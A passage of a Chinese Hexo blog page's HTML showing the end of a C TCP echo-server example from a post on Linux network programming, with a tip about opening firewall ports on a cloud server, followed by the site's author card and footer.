class="keyword">struct</span> sockaddr *)&amp;client_address, (<span class="type">socklen_t</span>*)&amp;client_address)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Accept failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从客户端接收消息并发送回复</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        <span class="keyword">if</span> (read(client_socket, buffer, <span class="keyword">sizeof</span>(buffer)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Client disconnected\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received message from client: %s&quot;</span>, buffer);</span><br><span class="line">        write(client_socket, buffer, <span class="built_in">strlen</span>(buffer));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭套接字</span></span><br><span class="line">    close(server_socket);</span><br><span class="line">    close(client_socket);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>将server部署到云服务器时，需在防火墙和策略组开放相应端口，端口的选择也应当注意，不要冲突。</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2022/09/19/linux%20%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <span class="current">1</span>
    
    
    
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/avatar.jpg" alt="avatar" />
        </div>
        <div class="name">desk9t</div>
        <div class="description">
            <p>Description<br>…</p>

        </div>
        
        
        <div class="friend-links">
            
            <div class="friend-link">
                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
            </div>
            
        </div>
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Q^Q
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;desk9t
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
